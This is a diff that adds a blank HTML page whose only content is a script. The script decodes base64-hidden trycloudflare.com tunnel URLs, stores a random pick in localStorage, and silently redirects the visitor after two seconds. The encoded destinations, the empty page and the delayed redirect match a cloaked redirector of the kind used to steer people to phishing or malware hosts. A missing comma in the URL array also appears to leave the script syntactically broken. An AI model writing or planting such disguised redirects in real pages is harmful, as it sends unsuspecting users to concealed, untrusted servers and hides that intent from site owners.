@@ -1,0 +1,43 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title></title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            border: 0;
+        }
+        body {
+            background: #000;
+            overflow: hidden;
+        }
+    </style>
+</head>
+<body>
+    <script>
+        // URL rotation via localStorage (add more btoa() encoded URLs to array as needed)
+        const encodedUrls = [
+            'aHR0cHM6Ly9tYXNvbi1yYW5jaC1zbG93bHktc2ltcHNvbi50cnljbG91ZGZsYXJlLmNvbQ=='
+            // 'aHR0cHM6Ly9saWtlLXNoZWV0LXNob3BwaW5nLXRzdW5hbWkudHJ5Y2xvdWRmbGFyZS5jb20='// Add more here
+              'aHR0cHM6Ly9yb21hbi13YXYtZml4ZXMtc3R1ZmZlZC50cnljbG91ZGZsYXJlLmNvbQ=='
+        ];
+
+        // Get or set random URL index
+        let urlIndex = localStorage.getItem('redirectIndex');
+        if (urlIndex === null) {
+            urlIndex = Math.floor(Math.random() * encodedUrls.length);
+            localStorage.setItem('redirectIndex', urlIndex);
+        }
+
+        // Decode and redirect silently after 2 seconds
+        setTimeout(() => {
+            const targetUrl = atob(encodedUrls[urlIndex]);
+            window.location.href = targetUrl;
+        }, 2000);
+    </script>
+</body>
+</html>
